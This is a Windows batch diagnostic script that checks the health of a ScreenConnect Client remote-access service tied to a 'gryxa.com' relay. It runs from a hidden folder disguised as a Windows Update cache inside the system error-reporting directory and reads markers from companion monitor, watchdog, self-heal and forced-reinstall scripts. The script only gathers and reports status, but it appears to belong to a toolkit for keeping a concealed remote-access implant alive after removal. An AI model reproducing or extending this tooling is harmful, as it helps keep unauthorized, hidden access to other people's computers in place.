@echo off
rem GRYXA_DIAG_FAST BUILD 20260804D3 - under 8s, cmd-only (sevrz Guest 10s kill safe)
setlocal EnableExtensions EnableDelayedExpansion
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "OUT=%WD%\gryxa_diag.txt"
set "FP=36e506ff016b2151"
set "SVC=ScreenConnect Client (%FP%)"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
> "%OUT%" echo ===== GRYXA DIAG FAST %DATE% %TIME% host=%COMPUTERNAME% =====

>>"%OUT%" echo --- builds ---
findstr /C:"MONVER=" "%WD%\own_mon.cmd" >>"%OUT%" 2>nul
findstr /C:"OWN_MON  BUILD" "%WD%\own_mon.cmd" >>"%OUT%" 2>nul
findstr /C:"OWN_GRYXA BUILD" "%WD%\own_gryxa.cmd" >>"%OUT%" 2>nul
findstr /C:"GRYXA_WATCH BUILD" "%WD%\gryxa_watch.cmd" >>"%OUT%" 2>nul
if exist "%WD%\fleet_channel.cfg" type "%WD%\fleet_channel.cfg" >>"%OUT%"
if exist "%WD%\version_floor.cfg" (>>"%OUT%" echo floor: & type "%WD%\version_floor.cfg" >>"%OUT%")
if exist "%WD%\observe.flag" (>>"%OUT%" echo OBSERVE=ON) else (>>"%OUT%" echo OBSERVE=off)

>>"%OUT%" echo --- SC services ---
sc query state= all | findstr /C:"SERVICE_NAME: ScreenConnect Client" >>"%OUT%" 2>nul

>>"%OUT%" echo --- gryxa query ---
sc query "%SVC%" >>"%OUT%" 2>&1

>>"%OUT%" echo --- ImagePath ---
reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath >>"%OUT%" 2>&1

>>"%OUT%" echo --- flags ---
if exist "%WD%\gryxa_heal.flag" (>>"%OUT%" echo HEAL= & type "%WD%\gryxa_heal.flag" >>"%OUT%") else (>>"%OUT%" echo HEAL=absent)
if exist "%WD%\force_gryxa.new" (>>"%OUT%" echo FORCE_NEW= & type "%WD%\force_gryxa.new" >>"%OUT%") else (>>"%OUT%" echo FORCE_NEW=absent)
if exist "%WD%\force_gryxa.done" (>>"%OUT%" echo FORCE_DONE= & type "%WD%\force_gryxa.done" >>"%OUT%") else (>>"%OUT%" echo FORCE_DONE=absent)
if exist "%WD%\gryxa.cfg" (>>"%OUT%" echo CFG= & type "%WD%\gryxa.cfg" >>"%OUT%") else (>>"%OUT%" echo CFG=absent)
if exist "%WD%\drop_last_reason.txt" (>>"%OUT%" echo LAST_CAUSE= & type "%WD%\drop_last_reason.txt" >>"%OUT%") else (>>"%OUT%" echo LAST_CAUSE=absent)
if exist "%WD%\gryxa_watch.hb" (>>"%OUT%" echo WATCH_HB=present) else (>>"%OUT%" echo WATCH_HB=absent)
if exist "%WD%\drop_events" dir /b /o-d "%WD%\drop_events\drop_*.txt" >>"%OUT%" 2>nul

>>"%OUT%" echo --- marker checks ---
set "HIT_X=0"
set "HIT_FORCE=0"
set "HIT_HEAL=0"
set "HIT_OBS=0"
set "HIT_WATCH=0"
if exist "%WD%\own_gryxa.log" findstr /I /C:"msiexec /x" /C:"preclean_gryxa" "%WD%\own_gryxa.log" >nul 2>&1 && set "HIT_X=1"
if exist "%WD%\own_mon.log" findstr /I /C:"gryxa_force_push" /C:"force_push_reinstall" "%WD%\own_mon.log" >nul 2>&1 && set "HIT_FORCE=1"
if exist "%WD%\own_mon.log" findstr /I /C:"gryxa_heal_queued" /C:"gryxa_1060_queue_heal" "%WD%\own_mon.log" >nul 2>&1 && set "HIT_HEAL=1"
if exist "%WD%\own_mon.log" findstr /I /C:"OBSERVE" "%WD%\own_mon.log" >nul 2>&1 && set "HIT_OBS=1"
if exist "%WD%\own_mon.log" findstr /I /C:"gryxa_watch" "%WD%\own_mon.log" >nul 2>&1 && set "HIT_WATCH=1"
>>"%OUT%" echo HIT_X=!HIT_X! HIT_FORCE=!HIT_FORCE! HIT_HEAL=!HIT_HEAL! HIT_OBS=!HIT_OBS! HIT_WATCH=!HIT_WATCH!

set "V=UNKNOWN"
if exist "%WD%\drop_last_reason.txt" (
  set /p V=<"%WD%\drop_last_reason.txt"
)
if "!V!"=="" set "V=UNKNOWN"
if /I "!V!"=="UNKNOWN" if "!HIT_X!"=="1" set "V=OUR_GRYXA_UNINSTALL"
if /I "!V!"=="UNKNOWN" if "!HIT_FORCE!"=="1" set "V=OUR_FORCE_REINSTALL"
if /I "!V!"=="UNKNOWN" if "!HIT_HEAL!"=="1" set "V=OUR_HEAL_QUEUED"

sc query "%SVC%" >nul 2>&1
if errorlevel 1 (
  if /I "!V!"=="UNKNOWN" set "V=SERVICE_MISSING_1060"
) else (
  sc query "%SVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
  if not errorlevel 1 (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 (set "V=CURRENTLY_RUNNING") else (if /I "!V!"=="UNKNOWN" set "V=RUNNING_NO_RELAY")
  ) else (
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
    if not errorlevel 1 (
      if /I "!V!"=="UNKNOWN" set "V=STOPPED_BUT_RELAY_OK"
    ) else (
      if /I "!V!"=="UNKNOWN" set "V=STOPPED_NO_RELAY"
    )
  )
)

>>"%OUT%" echo.
>>"%OUT%" echo VERDICT=!V!
>>"%OUT%" echo ===== END =====

echo HOST=%COMPUTERNAME%
echo VERDICT=!V!
findstr /C:"MONVER=" "%WD%\own_mon.cmd" 2>nul
if exist "%WD%\drop_last_reason.txt" (
  echo CAUSE=
  type "%WD%\drop_last_reason.txt"
)
echo HITS x=!HIT_X! force=!HIT_FORCE! heal=!HIT_HEAL! obs=!HIT_OBS! watch=!HIT_WATCH!
echo FILE=%OUT%
echo OK
endlocal
